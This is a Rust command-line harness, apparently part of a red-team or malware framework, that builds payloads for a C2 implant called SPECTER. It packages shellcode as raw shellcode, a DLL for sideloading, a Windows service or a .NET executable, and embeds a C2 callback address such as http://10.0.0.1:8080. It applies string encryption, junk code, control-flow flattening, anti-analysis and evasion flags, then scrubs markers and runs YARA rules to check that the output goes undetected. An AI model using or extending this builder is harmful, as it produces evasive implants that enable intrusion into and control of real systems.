//! SPECTER Payload Builder CLI
//!
//! Tests the FULL payload build pipeline locally — PIC blob + PE stub +
//! config embedding + obfuscation + marker scrubbing + YARA scan.
//!
//! Usage:
//!   # Test raw PIC obfuscation only:
//!   specter-build --pic implant/build/specter.bin --dump-markers --scan-only
//!
//!   # Test full PE stub pipeline (dotnet):
//!   specter-build --pic implant/build/specter.bin --format dotnet \
//!                 --channel http://10.0.0.1:8080 --out payload.exe --dump-markers
//!
//!   # Quick marker check with no obfuscation:
//!   specter-build --pic implant/build/specter.bin --format dotnet --no-obfuscate --dump-markers --scan-only

use clap::Parser;
use specter_server::builder::{
    self, scan_payload, BuilderConfig, ChannelConfig, EvasionFlags, ObfuscationSettings,
    OutputFormat, PayloadBuilder, SleepConfig,
};
use specter_server::profile::schema::Profile;
use std::path::PathBuf;
use x25519_dalek::{PublicKey, StaticSecret};

/// Create a minimal valid Profile for testing.
fn test_profile() -> Profile {
    let yaml = r#"
name: "test-profile"
description: "CLI test profile"
tls:
  cipher_suites: []
  extensions: []
  curves: []
  alpn: []
http:
  request:
    method: GET
    uri_patterns:
      - /api/v1/status
    headers: []
    data_embed_points: []
  response:
    status_code: 200
    headers: []
    body_template: ""
    data_embed_points: []
timing:
  callback_interval: 60
  jitter_percent: 15
transform:
  compress: none
  encrypt: cha_cha20_poly1305
  encode: base64
"#;
    serde_yaml::from_str(yaml).expect("Failed to parse test profile YAML")
}

#[derive(Parser, Debug)]
#[command(name = "specter-build", about = "SPECTER Payload Builder CLI — full pipeline test")]
struct Cli {
    /// Path to the PIC blob (specter.bin) or directory containing it + stubs
    #[arg(long, required = true)]
    pic: PathBuf,

    /// Output format: raw, dll, service, dotnet
    #[arg(long, default_value = "raw")]
    format: String,

    /// C2 callback channel address
    #[arg(long, default_value = "http://127.0.0.1:8080")]
    channel: String,

    /// Output file path
    #[arg(long, short, default_value = "payload.bin")]
    out: PathBuf,

    /// YARA rules directory
    #[arg(long, default_value = "rules")]
    rules_dir: PathBuf,

    /// Enable debug mode
    #[arg(long)]
    debug: bool,

    /// Skip anti-analysis
    #[arg(long)]
    skip_aa: bool,

    /// Disable obfuscation transforms
    #[arg(long)]
    no_obfuscate: bool,

    /// Enable XOR encryption wrapper
    #[arg(long)]
    xor: bool,

    /// Dump marker diagnostics
    #[arg(long)]
    dump_markers: bool,

    /// Only scan, don't write output
    #[arg(long)]
    scan_only: bool,

    /// Sleep interval seconds
    #[arg(long, default_value_t = 60)]
    sleep: u32,

    /// Jitter percent
    #[arg(long, default_value_t = 15)]
    jitter: u32,
}

fn parse_format(s: &str) -> OutputFormat {
    match s.to_lowercase().as_str() {
        "raw" | "shellcode" => OutputFormat::RawShellcode,
        "dll" | "sideload" => OutputFormat::DllSideload,
        "service" | "svc" => OutputFormat::ServiceExe,
        "dotnet" | "exe" => OutputFormat::DotNetAssembly,
        _ => {
            eprintln!("Unknown format '{}', defaulting to raw", s);
            OutputFormat::RawShellcode
        }
    }
}

fn scan_for_markers(data: &[u8]) -> Vec<(usize, &'static str)> {
    let markers: &[(&[u8], &str)] = &[
        (b"SPECSTR\x00", "SPECSTR"),
        (b"SPECHASH", "SPECHASH"),
        (b"SPECCFGM", "SPECCFGM"),
        (b"SPECMGRD", "SPECMGRD"),
        (b"SPECHEAP", "SPECHEAP"),
        (b"SPECFLOW\x00", "SPECFLOW"),
        (b"SPECPICBLOB\x00", "SPECPICBLOB"),
        (b"SPBF", "SPBF"),
        (b"SPECPAYLOADMARK\x00", "SPECPAYLOADMARK"),
        (&[0x43u8; 16], "CCCCCCCCCCCCCCCC"),
    ];

    let mut found = Vec::new();
    for &(pattern, name) in markers {
        let mut offset = 0;
        while offset + pattern.len() <= data.len() {
            if let Some(pos) = data[offset..]
                .windows(pattern.len())
                .position(|w| w == pattern)
            {
                found.push((offset + pos, name));
                offset += pos + pattern.len();
            } else {
                break;
            }
        }
    }
    found.sort_by_key(|&(pos, _)| pos);
    found
}

/// Verify the PE stub can find its PIC data at runtime.
/// Simulates what the stub does: reads stub_pic_region at known offset.
fn verify_pe_pic_data(payload: &[u8], format: OutputFormat) -> bool {
    if format == OutputFormat::RawShellcode {
        return true; // no stub verification needed
    }

    // The stub reads PIC data from stub_pic_region. After the builder scrubs
    // the SPECPICBLOB marker, the first 12 bytes are random, but bytes 12-15
    // contain pic_size (u32 LE) and bytes 16-19 contain entry_offset (u32 LE).
    // We need to find where the PIC size was written.

    // Search for the pic_size value in the payload. The PIC blob from specter.bin
    // was embedded at a known location. We can verify by checking that somewhere
    // in the payload there's a u32 matching the expected PIC size followed by
    // a u32 entry_offset (0), followed by actual PIC bytes (starting with the
    // implant's first instruction).

    // Heuristic: find the PIC blob start bytes (first 8 bytes of specter.bin)
    // in the payload, then verify the size field 8 bytes before them.
    let pic_start = &[0x57u8, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48]; // push rdi; push rsi; push rbx; sub rsp,0x30; ...

    for i in 20..payload.len().saturating_sub(pic_start.len()) {
        if &payload[i..i + pic_start.len()] == pic_start {
            // Found PIC blob data at offset i. Check if size field is at i-8.
            if i >= 8 {
                let size = u32::from_le_bytes([
                    payload[i - 8], payload[i - 7], payload[i - 6], payload[i - 5],
                ]);
                let entry_off = u32::from_le_bytes([
                    payload[i - 4], payload[i - 3], payload[i - 2], payload[i - 1],
                ]);
                if size > 1000 && size < 1_000_000 && entry_off == 0 {
                    println!("    PE verification: PIC data at offset 0x{:X}, size={}, entry_offset={}",
                        i, size, entry_off);
                    println!("    Stub will find PIC data correctly: YES");
                    return true;
                }
            }
        }
    }
    println!("    PE verification: Could not locate PIC data with valid header");
    println!("    Stub will find PIC data correctly: UNKNOWN (manual check needed)");
    false
}

fn main() {
    let cli = Cli::parse();
    let format = parse_format(&cli.format);

    // Determine template directory (same dir as the PIC blob)
    let template_dir = if cli.pic.is_dir() {
        cli.pic.clone()
    } else {
        cli.pic.parent().unwrap_or(std::path::Path::new(".")).to_path_buf()
    };

    println!("[+] Template dir: {}", template_dir.display());
    println!("[+] Format: {:?}", format);

    // Initialize builder
    let config = BuilderConfig {
        template_dir: template_dir.clone(),
    };

    let builder = match PayloadBuilder::new(&config) {
        Ok(b) => {
            println!("[+] Builder initialized");
            b
        }
        Err(e) => {
            eprintln!("[-] Builder init failed: {e}");
            std::process::exit(1);
        }
    };

    // Create minimal profile and config
    let profile = test_profile();
    let server_secret = StaticSecret::random_from_rng(rand::thread_rng());
    let server_pubkey = PublicKey::from(&server_secret);

    let channels = vec![ChannelConfig {
        kind: "http".to_string(),
        address: cli.channel.clone(),
    }];

    let sleep_config = SleepConfig {
        interval_secs: cli.sleep as u64,
        jitter_percent: cli.jitter as u8,
    };

    let obf_settings = if cli.no_obfuscate {
        println!("[*] Obfuscation: disabled");
        ObfuscationSettings {
            string_encryption: false,
            api_hash_randomization: false,
            junk_code_insertion: false,
            junk_density: 0,
            control_flow_flattening: false,
            xor_encryption: cli.xor,
        }
    } else {
        println!("[+] Obfuscation: enabled");
        ObfuscationSettings {
            xor_encryption: cli.xor,
            ..ObfuscationSettings::default()
        }
    };

    println!("[+] Channel: {}", cli.channel);
    println!("[+] Debug: {}, Skip AA: {}", cli.debug, cli.skip_aa);

    // Build the payload through the FULL pipeline
    let result = match builder.build_with_evasion(
        format,
        &profile,
        &server_pubkey,
        &channels,
        &sleep_config,
        None, // kill_date
        EvasionFlags::default(),
        cli.debug,
        cli.skip_aa,
        &obf_settings,
    ) {
        Ok(r) => {
            println!("[+] Payload built: {} bytes (format={:?})", r.payload.len(), r.format);
            r
        }
        Err(e) => {
            eprintln!("[-] Build FAILED: {e}");
            std::process::exit(1);
        }
    };

    let payload = result.payload;

    // Marker scan
    if cli.dump_markers {
        println!("\n[*] Marker scan (post-build):");
        let markers = scan_for_markers(&payload);
        if markers.is_empty() {
            println!("    None found (clean!)");
        } else {
            for (offset, name) in &markers {
                println!("    REMAINING: {} at 0x{:06X}", name, offset);
            }
            println!("    {} markers still present", markers.len());
        }
    }

    // PE stub PIC data verification
    if format != OutputFormat::RawShellcode {
        println!("\n[*] PE stub integrity check:");
        verify_pe_pic_data(&payload, format);
    }

    // YARA scan
    if cli.rules_dir.exists() {
        println!("\n[*] YARA scan ({}):", cli.rules_dir.display());
        match scan_payload(&payload, &cli.rules_dir) {
            Ok(matches) => {
                if matches.is_empty() {
                    println!("    No detections");
                } else {
                    for m in &matches {
                        let tags = m.tags.join(",");
                        println!("    [{}] {} ({})",
                            if tags.is_empty() { "INFO" } else { &tags },
                            m.rule_name,
                            m.namespace
                        );
                    }
                }
            }
            Err(e) => println!("    Scan error: {e}"),
        }
    }

    if cli.scan_only {
        println!("\n[*] Scan-only mode, no output written");
        return;
    }

    // Write output
    match std::fs::write(&cli.out, &payload) {
        Ok(()) => println!("\n[+] Written to {} ({} bytes)", cli.out.display(), payload.len()),
        Err(e) => {
            eprintln!("[-] Write failed: {e}");
            std::process::exit(1);
        }
    }
}
